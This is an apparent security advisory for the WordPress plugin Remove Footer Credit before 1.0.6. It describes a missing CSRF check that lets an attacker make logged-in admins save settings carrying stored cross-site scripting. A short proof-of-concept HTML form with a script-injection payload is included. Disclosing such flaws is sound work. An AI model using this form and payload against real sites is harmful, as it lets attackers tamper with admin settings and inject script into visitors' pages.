## WordPress Plugin Vulnerabilities

# Remove Footer Credit < 1.0.6 - CSRF to Stored Cross-Site Scripting

### Description

The plugin does not have CSRF check in place when saving its settings, which could allow attacker to make logged in admins change them and lead to Stored XSS issue as well due to the lack of sanitisation

Notes:

- v1.0.6 fixed the CSRF, however sanitisation only removed script tags, leading to an Authenticated Stored XSS issue, a separate advisory has been created for it

### Proof of Concept

<html>
<body>
<form action="https://example.com/wp-admin/tools.php?page=remove-footer-credit" method="POST">
<input type="hidden" name="find" value="powered" />
<input type="hidden" name="replace" value='">--><script>alert(/XSS/)</script>' />
<input type="hidden" name="willLinkback" value="no" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
Note: The find/replace values depend on the theme used (tested with Twenty twenty) and the XSS will be triggered in the frontend
